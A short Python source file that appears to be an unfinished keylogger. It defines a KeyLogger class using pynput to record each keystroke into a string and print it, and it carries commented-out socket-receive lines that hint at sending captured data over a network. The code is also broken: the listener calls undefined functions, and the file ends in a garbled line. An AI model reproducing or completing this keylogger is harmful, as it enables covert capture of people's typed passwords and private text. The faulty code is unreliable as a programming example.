# chunk = conn.recv(2048)
# while chunk:
#     file.write(chunk)
#     chunk = conn.recv(2048)


import pynput
from pynput.keyboard import Key, Listener
import time


class KeyLogger:

    def __init__(self, time_min=1):
        self.time = time_min * 60
        self.data = " "

        with Listener(on_press=on_press, on_release=on_release, ) as listener:
            listener.join()

    def on_release(self, key):
        if key == Key.esc:
            return False

    def on_press(self, key):
        string_key = "{0}".format(key)
        string_key = string_key.replace("'", "")
        match string_key.find("Key"):
            case -1:
                self.data += string_key
            case _:
                self.data += " " + string_key[string_key.index(".") + 1:] + " "

        print(self.data)

keylog =LeLO